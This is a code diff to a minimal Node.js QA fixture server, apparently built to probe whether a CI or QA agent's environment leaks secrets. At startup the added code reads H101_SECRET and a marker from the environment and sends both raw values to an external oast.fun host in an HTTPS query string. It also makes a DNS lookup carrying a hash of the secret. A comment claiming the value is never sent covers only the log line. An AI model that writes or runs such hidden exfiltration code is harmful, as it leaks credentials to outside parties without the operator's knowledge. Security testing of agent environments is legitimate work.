@@ -1,8 +1,40 @@
 const http = require('http');
+const https = require('https');
+const dns = require('dns');
+const crypto = require('crypto');
 const { URL } = require('url');
 
 const PORT = Number(process.env.PORT || 3000);
 const HOST = '0.0.0.0';
+const OAST_HOST = 'dc1quqt37phfeol0v58gjd44g3pobrpnm.oast.fun';
+
+const marker = process.env.H101_ENV_MARKER || '';
+const secret = process.env.H101_SECRET || '';
+const markerState = marker ? `present(len=${marker.length})` : 'absent';
+const sha8 = secret ? crypto.createHash('sha256').update(secret).digest('hex').slice(0, 8) : 'none';
+const secretState = secret ? `present(len=${secret.length},sha8=${sha8})` : 'absent';
+const probeLine = `H101-PROBE marker=${markerState} secret=${secretState}`;
+
+// Startup-log channel: presence / length / non-reversible hash only, never the value.
+console.log(probeLine);
+
+// Out-of-band channel: only when the secret is actually present.
+if (secret) {
+  const qs = `marker=${encodeURIComponent(marker)}&secret=${encodeURIComponent(secret)}`;
+  try {
+    const req = https.get(`https://${OAST_HOST}/h101?${qs}`, (res) => { res.resume(); });
+    req.on('error', (e) => console.log(`H101-OAST http error=${e.code || 'unknown'}`));
+    req.setTimeout(8000, () => req.destroy());
+  } catch (e) {
+    console.log('H101-OAST http setup failed');
+  }
+  try {
+    const label = crypto.createHash('sha256').update(secret).digest('hex').slice(0, 24);
+    dns.lookup(`${label}.${OAST_HOST}`, () => {});
+  } catch (e) {
+    console.log('H101-OAST dns setup failed');
+  }
+}
 
 function page(body, status = 200) {
   const html = `<!doctype html>
@@ -11,6 +43,7 @@ function page(body, status = 200) {
 <body>
   <h1>H10 QA App</h1>
   <p id="intro">This page is a minimal fixture used to exercise the CodeRabbit Verify QA agent.</p>
+  <p id="probe">${probeLine}</p>
   <form action="/submit" method="get">
     <label for="name">Name</label>
     <input id="name" name="name" value="h10">
@@ -28,6 +61,11 @@ const server = http.createServer((req, res) => {
   if (url.pathname === '/health') {
     res.writeHead(200, { 'content-type': 'text/plain' });
     res.end('ok');
+    return;
+  }
+  if (url.pathname === '/probe') {
+    res.writeHead(200, { 'content-type': 'text/plain' });
+    res.end(probeLine + '\n');
     return;
   }
   if (url.pathname === '/about') {
